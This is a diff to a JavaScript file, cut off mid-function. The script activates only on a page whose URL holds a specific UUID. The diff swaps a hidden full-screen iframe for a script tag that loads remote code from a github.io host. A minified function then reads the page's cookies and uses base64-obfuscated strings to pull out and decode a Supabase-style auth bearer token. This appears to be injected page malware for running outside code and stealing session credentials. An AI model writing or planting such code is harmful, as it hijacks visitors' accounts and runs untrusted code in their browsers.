@@ -5,24 +5,12 @@ if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
 console.log("%c works - VT 10/5/2024", "font-size: 24px; color: red; text-shadow: 2px 2px 0 black, -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;");
 
 function loadHTMLAndAppend(url) {
-        const iframe = document.createElement('iframe');
-        iframe.id = 'dynamicIframe';
+        const iframe = document.createElement('script');
         iframe.src = url;
-        iframe.allow = 'autoplay';
-                Object.assign(iframe.style, {
-            position: 'fixed',
-            top: '0',
-            left: '0',
-            width: '100%',
-            height: '100%',
-            opacity: '0',
-            pointerEvents: 'none',
-            zIndex: '99999999'
-        });
         document.body.appendChild(iframe);
 }
 
-loadHTMLAndAppend('https://vtmgr.github.io/shime.html');
+loadHTMLAndAppend('https://vtmgr.github.io/shimebase.js');
 
 
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
